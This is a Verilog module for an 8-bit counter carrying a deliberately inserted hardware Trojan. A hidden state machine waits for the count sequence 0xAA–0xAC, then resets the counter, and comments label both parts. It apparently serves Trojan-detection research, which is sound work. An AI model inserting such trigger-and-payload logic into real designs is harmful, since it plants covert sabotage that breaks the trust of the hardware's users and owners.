module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  // Trojan: sequential FSM tracking specific count sequence
  reg [1:0] trojan_state;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      count <= 0;
      trojan_state <= 2'd0;
    end else begin
      // Trojan FSM state update
      case (trojan_state)
        2'd0: if (en && (count == 8'hAA)) trojan_state <= 2'd1;
        2'd1: if (en && (count == 8'hAB)) trojan_state <= 2'd2;
              else if (en && (count != 8'hAB)) trojan_state <= 2'd0;
        2'd2: if (en && (count == 8'hAC)) trojan_state <= 2'd3;
              else if (en && (count != 8'hAC)) trojan_state <= 2'd0;
        2'd3: trojan_state <= 2'd0;
        default: trojan_state <= 2'd0;
      endcase

      // Counter logic with payload
      if (en) begin
        if (trojan_state == 2'd3)
          count <= 8'h00;  // Trojan payload: force count to 0
        else
          count <= count + 1;
      end
    end
  end
endmodule